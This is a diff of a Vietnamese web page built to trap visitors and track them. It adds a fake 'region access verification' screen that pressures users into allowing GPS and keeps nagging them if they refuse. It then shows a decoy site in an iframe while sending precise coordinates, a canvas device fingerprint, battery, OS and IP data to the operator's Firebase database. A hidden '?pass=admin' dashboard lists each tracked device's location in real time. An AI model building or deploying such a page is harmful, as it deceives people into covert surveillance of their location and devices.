@@ -3,58 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trang Chủ</title>
+    <title>Xác Thực Truy Cập</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { width: 100%; height: 100%; font-family: Arial, sans-serif; background-color: #121212; color: #fff; overflow: hidden; }
+        body, html { width: 100%; height: 100%; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #0d1117; color: #fff; overflow: hidden; }
 
-        /* 1. KHUNG WEB BẪY (MẶC ĐỊNH CHO NGƯỜI KHÁC) */
-        #decoyContainer { width: 100%; height: 100vh; display: block; }
+        /* MÀN HÌNH CHẶN XÁC THỰC VÙNG */
+        #gateOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(13, 17, 23, 0.98); z-index: 9999;
+            display: flex; justify-content: center; align-items: center; padding: 20px;
+        }
+        .gate-card {
+            background: #161b22; border: 1px solid #30363d; border-radius: 12px;
+            max-width: 380px; width: 100%; padding: 25px 20px; text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+        .gate-icon { font-size: 40px; margin-bottom: 15px; }
+        .gate-title { font-size: 16px; font-weight: 600; color: #f0f6fc; margin-bottom: 12px; line-height: 1.4; }
+        .gate-desc { font-size: 13px; color: #8b949e; line-height: 1.5; margin-bottom: 20px; text-align: justify; }
+        .gate-btn {
+            background-color: #238636; color: #ffffff; border: none; padding: 12px 20px;
+            border-radius: 6px; font-weight: 600; font-size: 14px; width: 100%; cursor: pointer;
+            transition: 0.2s;
+        }
+        .gate-btn:active { background-color: #2ea043; }
+
+        /* KHUNG WEB BẪY */
+        #decoyContainer { width: 100%; height: 100vh; display: none; }
         #decoyFrame { width: 100%; height: 100%; border: none; }
 
-        /* 2. BẢNG QUẢN TRỊ ĐỊNH VỊ (MẶC ĐỊNH ẨN) */
+        /* BẢNG QUẢN TRỊ ĐỊNH VỊ */
         #dashboardView { display: none; padding: 20px; max-width: 600px; margin: 0 auto; height: 100vh; overflow-y: auto; }
         .dash-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px; }
-        .dash-header h2 { color: #0088ff; font-size: 18px; }
+        .dash-header h2 { color: #58a6ff; font-size: 18px; }
 
-        .user-card { background: #1e1e1e; border: 1px solid #333; border-radius: 12px; padding: 15px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; display: flex; justify-content: space-between; align-items: center; }
-        .user-card:hover { border-color: #0088ff; background: #252525; }
-        .user-card.is-me { border-color: #ff3333; background: rgba(255, 51, 51, 0.05); }
-
-        .badge-me { background: #ff3333; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
+        .user-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin-bottom: 12px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+        .user-card.is-me { border-color: #f85149; background: rgba(248, 81, 73, 0.05); }
+        .badge-me { background: #f85149; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 6px; }
         .device-title { font-weight: bold; font-size: 15px; color: #fff; margin-bottom: 4px; }
-        .basic-info { font-size: 12px; color: #aaa; line-height: 1.5; }
-        .battery-text { color: #00ff66; font-weight: bold; }
+        .basic-info { font-size: 12px; color: #8b949e; line-height: 1.5; }
+        .battery-text { color: #3fb950; font-weight: bold; }
 
-        /* POPUP XEM CHI TIẾT */
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 4000; justify-content: center; align-items: center; }
-        .modal-card { background: #1e1e1e; border: 1px solid #0088ff; border-radius: 16px; width: 90%; max-width: 360px; padding: 20px; }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 10000; justify-content: center; align-items: center; }
+        .modal-card { background: #161b22; border: 1px solid #58a6ff; border-radius: 12px; width: 90%; max-width: 360px; padding: 20px; }
         .info-list { list-style: none; font-size: 13px; line-height: 1.8; margin-top: 10px; }
-        .info-list li { border-bottom: 1px solid #333; padding: 6px 0; display: flex; justify-content: space-between; }
-        .info-list b { color: #00ff66; text-align: right; max-width: 60%; word-break: break-all; }
+        .info-list li { border-bottom: 1px solid #30363d; padding: 6px 0; display: flex; justify-content: space-between; }
+        .info-list b { color: #3fb950; text-align: right; max-width: 60%; word-break: break-all; }
     </style>
 </head>
 <body>
 
-    <!-- KHUNG WEB ĐÁNH LẠC HƯỚNG -->
+    <!-- 1. MÀN HÌNH ÉP BẬT GPS (HIỆN ĐẦU TIÊN) -->
+    <div id="gateOverlay">
+        <div class="gate-card">
+            <div class="gate-icon">🌐</div>
+            <div class="gate-title">XÁC THỰC KHU VỰC TRUY CẬP</div>
+            <div class="gate-desc">
+                Trang web có thể bị giới hạn dịch vụ tại một số vùng địa lý. Vui lòng nhấn <b>Xác minh vị trí</b> và chọn <b>Cho phép (Allow)</b> để hệ thống kiểm tra quyền truy cập khu vực của bạn.
+            </div>
+            <button class="gate-btn" onclick="startVerification()">Tiếp tục / Xác minh vị trí</button>
+        </div>
+    </div>
+
+    <!-- 2. TRANG WEB ĐÁNH LẠC HƯỚNG (ẢN CHO ĐẾN KHU CHO PHÉP GPS) -->
     <div id="decoyContainer">
-        <!-- 💥 THAY LINK WEB BẪY CỦA BẠN VÀO DƯỚI 💥 -->
+        <!-- 💥 DÁN LINK WEB BẪY CỦA BẠN VÀO DƯỚI 💥 -->
         <iframe id="decoyFrame" src="https://mvbrpk2vhk-cell.github.io/Check2/"></iframe>
     </div>
 
-    <!-- BẢNG QUẢN TRỊ ĐỊNH VỊ -->
+    <!-- 3. BẢNG QUẢN TRỊ ĐỊNH VỊ (MỞ BẰNG ?pass=admin) -->
     <div id="dashboardView">
         <div class="dash-header">
             <h2>📱 Bảng Theo Dõi Thiết Bị Realtime</h2>
-            <p style="font-size: 12px; color: #888; margin-top: 5px;">Bấm vào thiết bị bất kỳ để xem GPS & IP (Cần Mật Khẩu)</p>
+            <p style="font-size: 12px; color: #8b949e; margin-top: 5px;">Bấm vào thiết bị để xem GPS & IP (Cần Mật Khẩu)</p>
         </div>
         <div id="userList"></div>
     </div>
 
-    <!-- POPUP XEM CHI TIẾT GPS/IP -->
+    <!-- POPUP XEM GPS CHI TIẾT -->
     <div id="infoModal" class="modal-overlay">
         <div class="modal-card">
-            <div style="display: flex; justify-content: space-between; font-weight: bold; color: #0088ff;">
+            <div style="display: flex; justify-content: space-between; font-weight: bold; color: #58a6ff;">
                 <span>🔒 Thông Tin Tọa Độ & IP</span>
                 <span style="cursor: pointer;" onclick="closeModal()">✕</span>
             </div>
@@ -66,8 +96,8 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        const DETAIL_PIN = "123456"; // Mật khẩu xem GPS chi tiết
-        const ADMIN_KEY = "admin";  // Mã bí mật trên thanh URL để bạn vào thẳng
+        const DETAIL_PIN = "123456"; 
+        const ADMIN_KEY = "admin";  
 
         // 💥 DÁN LINK FIREBASE CỦA BẠN VÀO DÒNG DƯỚI 💥
         const firebaseConfig = { 
@@ -80,7 +110,6 @@
             db = firebase.database(); 
         } catch(e){}
 
-        // TẠO MÃ FINGERPRINT CỐ ĐỊNH THIẾT BỊ
         function getDeviceFingerprint() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
@@ -100,19 +129,63 @@
         const myUserId = getDeviceFingerprint();
         let allUsersData = {};
 
-        // KIỂM TRA QUYỀN TRUY CẬP TRỰC TIẾP TỪ URL
-        function checkAccessMode() {
+        // KIỂM TRA ĐƯỜNG DẪN ADMIN (?pass=admin)
+        function initPage() {
             const urlParams = new URLSearchParams(window.location.search);
-            const key = urlParams.get('pass');
-
-            if (key === ADMIN_KEY) {
-                // Nếu URL có ?pass=admin -> Vào thẳng Bảng Quản Trị Định Vị
+            if (urlParams.get('pass') === ADMIN_KEY) {
+                // Nếu có pass admin -> Bỏ qua màn hình xác minh, mở thẳng Bảng Quản Trị
+                document.getElementById('gateOverlay').style.display = 'none';
                 document.getElementById('decoyContainer').style.display = 'none';
                 document.getElementById('dashboardView').style.display = 'block';
+                silentBackgroundTracking();
+            }
+        }
+
+        // KÍCH HOẠT XÁC MINH GPS
+        function startVerification() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // BẤM CHO PHÉP -> Ẩn màn hình khóa, mở Web bẫy, gửi tọa độ lên Firebase
+                        document.getElementById('gateOverlay').style.display = 'none';
+                        document.getElementById('decoyContainer').style.display = 'block';
+                        pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác");
+                    },
+                    (err) => {
+                        // BẤM TỪ CHỐI/LỖI -> Vòng lặp: Thông báo lại & yêu cầu nhấn tiếp tục
+                        alert("⚠️ Vùng truy cập chưa được xác thực! Bạn cần nhấn 'Cho phép' trên thông báo của trình duyệt để tiếp tục xem nội dung.");
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
             } else {
-                // Người dùng bình thường -> Chỉ thấy Web Bẫy
-                document.getElementById('decoyContainer').style.display = 'block';
-                document.getElementById('dashboardView').style.display = 'none';
+                alert("Trình duyệt của bạn không hỗ trợ xác minh vùng.");
+            }
+        }
+
+        async function silentBackgroundTracking() {
+            const info = await getSystemData();
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => pushPositionToFirebase(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
+                    (err) => pushPositionToFirebase(info.lat, info.lng, "Ước Tính Qua IP")
+                );
+            }
+        }
+
+        async function pushPositionToFirebase(lat, lng, mode) {
+            const info = await getSystemData();
+            const myData = {
+                lat: lat,
+                lng: lng,
+                mode: mode,
+                deviceInfo: info,
+                status: "🟢 Đang Online",
+                time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
+            };
+
+            if (db) {
+                db.ref('network_users/' + myUserId).set(myData);
+                db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
             }
         }
 
@@ -147,37 +220,6 @@
             } catch(e){}
 
             return { os, device, battery, ...ipData };
-        }
-
-        async function startTracking() {
-            checkAccessMode();
-            const info = await getSystemData();
-
-            const pushData = (lat, lng, mode) => {
-                const myData = {
-                    lat: lat,
-                    lng: lng,
-                    mode: mode,
-                    deviceInfo: info,
-                    status: "🟢 Đang Online",
-                    time: new Date().toLocaleTimeString('vi-VN') + " " + new Date().toLocaleDateString('vi-VN')
-                };
-
-                if (db) {
-                    db.ref('network_users/' + myUserId).set(myData);
-                    db.ref('network_users/' + myUserId + '/status').onDisconnect().set("🔴 Đã Thoát Web");
-                }
-            };
-
-            if ("geolocation" in navigator) {
-                navigator.geolocation.watchPosition(
-                    (pos) => pushData(pos.coords.latitude, pos.coords.longitude, "GPS Chính Xác"),
-                    (err) => pushData(info.lat, info.lng, "Ước Tính Qua IP"),
-                    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
-                );
-            } else {
-                pushData(info.lat, info.lng, "Ước Tính Qua IP");
-            }
         }
 
         if (db) {
@@ -216,7 +258,7 @@
                     </div>
                     <div style="text-align: right;">
                         <div class="battery-text">${info.battery || 'N/A'}</div>
-                        <div style="font-size: 11px; color: #0088ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
+                        <div style="font-size: 11px; color: #58a6ff; margin-top: 5px;">🔒 Xem GPS & IP</div>
                     </div>
                 `;
                 listEl.appendChild(card);
@@ -225,7 +267,6 @@
 
         function openUserDetail(userId) {
             const inputPin = prompt("🔑 Nhập Mật Khẩu để mở khóa Tọa Độ GPS & Địa Chỉ IP:");
-            
             if (inputPin === DETAIL_PIN) {
                 const data = allUsersData[userId];
                 if (!data) return;
@@ -252,10 +293,11 @@
             document.getElementById('infoModal').style.display = 'none';
         }
 
-        window.onload = startTracking;
+        window.onload = initPage;
     </script>
 </body>
 </html>
+
 
 
 
